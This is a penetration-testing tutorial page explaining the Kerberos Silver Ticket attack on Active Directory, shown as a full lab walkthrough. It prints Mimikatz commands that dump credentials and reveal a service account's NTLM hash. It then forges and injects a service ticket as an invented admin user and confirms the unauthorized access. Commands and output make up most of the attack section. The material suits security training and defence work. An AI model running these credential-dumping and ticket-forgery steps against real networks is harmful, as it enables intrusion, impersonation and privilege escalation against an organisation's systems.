---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Silver Tickets

## Background

Recall how [Kerberos authentication](../#operation-details) works in AD. When a user signs on the authenticate with the KDC/AS (domain controller in AD). They are then granted a TGT. When the user wants to use some service, a TGS is requested. Two messages are sent during this exchange: the `TGS-REQ` is sent to the domain controller, the domain controller grants the ticket in a `TGS-REP` message. The `TGS-REP` is encrypted with the _hash of the account that is running the service_. The TGS-REP will be passed to the service in the `AP-REQ` message. It will then be decrypted (and verified if PAC validation is enabled) before access is granted.

Because the `TGS-REP` is the encrypted with the hash of the service account, if an attacker manages to extract the password or NT hash of said service account, they can then forge a service ticket (TGS) by choosing the information he wants to put in it in order to access that service, without asking the KDC. It is the attacker who builds this ticket. It is this forged ticket that is called [**Silver Ticket**](https://en.hackndo.com/kerberos-silver-golden-tickets/).

This technique _only works if_ [_PAC validation_](../#pac-validation) _is disabled_.

In order to forge a silver ticket an attacker will need 3 things:

1. NT Hash (or password) of service account
2. Domain SID
3. Service's SPN

1 is really the only difficult item. 2 & 3 can be found fairly easily from any domain-connected account. Once an attacker stumbles across an NT Hash of a service account they can create a block of data corresponding to a ticket like the one found in `TGS-REP`. They will specify the domain name, the name of the requested service (SPN), a username (which can be chosen arbitrarily), a PAC (which he can also forge). Here is a simplistic example of a ticket that the attacker can create:

```
realm: corp.com
sname: iis_service\web04.corp.com
enc-part:    
    key: 0x309DC6FA122BA1C           # Arbitrary session key
    crealm: corp.com
    cname: fakeAdmin
    authtime: 2050/01/01 00:00:00    # Ticket validity date
    authorization-data : Forged PAC where, say, this user is Domain Admin
```

The `enc-part` block is then encrypted with the NT Hash of the service account. After encryption, an `AP-REQ` can be created by combining this with an authenticator. [Recall](../#client-service-request) that an authenticator is simply the client's username (`fakeAdmin` here) and a timestamp encrypted with the session key (same `key` as in the `enc-part` block above).

First the service will decode enc-part using its (compromised) NT Hash. It will then use the session key found therein to decrypt the authenticator and validate the user.

This step here is why PAC validation must be disabled for this technique to work. [Recall](../#privilege-attribute-certificate) that a PAC is usually double-signed. The first signature uses service account’s secret, but the second uses domain controller’s secret (`krbtgt` account’s secret). The second (`krbtgt`) signature is only validated when PAC validation is enabled. In this scenario the attacker only has access to the service's NT hash. Therefore the forged PAC included in this ticket was not actually signed by the real `krbtgt` secret and thus validation would fail. In practice there is a second signature applied to the PAC (using an arbitrary key) in the silver ticket it is just (hopefully) not checked.

## Finding a Service Hash

### Mimikatz

Finding a service's hash follows the usual route. It is easiest to use Mimikatz on a compromised machine and then look through for any useful accounts. In the example case it turns out iis\_services's password was among those found:

```
mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

652     {0;000003e7} 1 D 41375          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;002ec209} 2 F 5520367     CORP\jeff       S-1-5-21-1987370270-658905905-1781884369-1105   (13g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 5676798     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

...

Authentication Id : 0 ; 1115501 (00000000:0011056d)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 3/29/2024 2:31:59 PM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
        tspkg :
        wdigest :
         * Username : iis_service
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : iis_service
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO

...        
```

Perfect, now all that is still needed is the domain's SID and the SPN.

## Domain SID

### PowerShell

The technique for getting domain information was covered in the [manual enumeration](../../enumeration/manual.md) section. Using the `Get-ADDomain` cmdlet from [Enumerate-AD](../../enumeration/manual.md#enumerate-a-d) and selecting the SID property is the easiest way to get the domain SID:

```powershell
Get-ADDomain | Select SID
```

When run the SID is revealed:

```powershell
PS C:\Users\jeff> Get-ADDomain | Select SID

SID
---
S-1-5-21-1987370270-658905905-1781884369
```

### whoami

[Recall](../../../privilege-escalation/privilege-basics.md#security-identifier-sid) a user's SID is constructed from the domain's SID and the relative identifier (RID) of the particular user. Therefore the domain's SID can be determined from the user's. The whoami command can be used to reveal the current user's SID:

```sh
whoami /user
```

When run it shows the user's SID:

```shell-session
C:\Users\jeff>whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

The RID (`-1105`) can be removed to reveal the domain's SID.

## SPN

There are several ways to determine the SPN. The first is just guesswork. The structure is `service_name/host.domain`. So in this case one is presumably targeting HTTP (given the user whose hash was obtained is `iis_service`). And the machine being targeted is `WEB04` in the `corp.com` domain. Therefore an educated guess is that the SPN is `http/web04.corp.com`.

### PowerShell

Again Enumerate-AD can be used to find the SPN. Either a specific user can be searched and their SPNs enumerated with:

```powershell
(Get-ADUser "username").ServicePrincipalNames
```

This could be used on `iis_service` to reveal associated SPNs:

```powershell
PS C:\Users\jeff> (Get-ADUser iis_service).ServicePrincipalNames
HTTP/web04.corp.com
HTTP/web04
HTTP/web04.corp.com:80
```

Alternatively all SPNs can be listed with the cmdlet:

```powershell
Get-AllSPNs | Sort
```

When run the desired SPN is found in the list:

```powershell
PS C:\Users\jeff> Get-AllSPNs | Sort
...
HTTP/web04
HTTP/web04.corp.com
HTTP/web04.corp.com:80
...
```

## Forging the Ticket

The attacker is attempting to access the HTTP service running at web04. To test access the attacker can use the PowerShell snippet:

```powershell
iwr -UseDefaultCredentials http://web04
```

When run initially access is denied:

```powershell
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr : Server Error
401 - Unauthorized: Access is denied due to invalid credentials.
You do not have permission to view this directory or page using the credentials that you supplied.
At line:1 char:1
+ iwr -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

This will be tested again with after forging the ticket.

### Mimikatz

Mimikatz can now be used to forge a silver ticket for `iis_service`. The Mimikatz command is shown and described below:

{% code overflow="wrap" %}
```
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
{% endcode %}

* `/sid` is the domain SID
* `/domain` is the domain name
* `/ptt` injects the forged ticket into the memory of the current machine making the ticket usable
* `/service` is the first part of the SPN
* `/target` is the full hostname of the machine
* `/rc4` is used to pass the NTLM hash of the `iis_service` account

The output of the command indicates successful forging:

```shell-session
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_nt
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

The ticket can be verified using the [`klist`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist) command which lists available Kerberos tickets:

```
C:\Users\jeff>klist

Current LogonId is 0:0x11cf68

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 3/30/2024 18:25:28 (local)
        End Time:   3/28/2034 18:25:28 (local)
        Renew Time: 3/28/2034 18:25:28 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

This time the test `Invoke-WebRequest` is successful:

```powershell
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04


StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
...
RawContent        : HTTP/1.1 200 OK
...
```

Authentication was successful with the forged ticket! The ticket will remain valid as long as PAC validation remains off and until the `iis_service` account password (and thus hash) is changed.
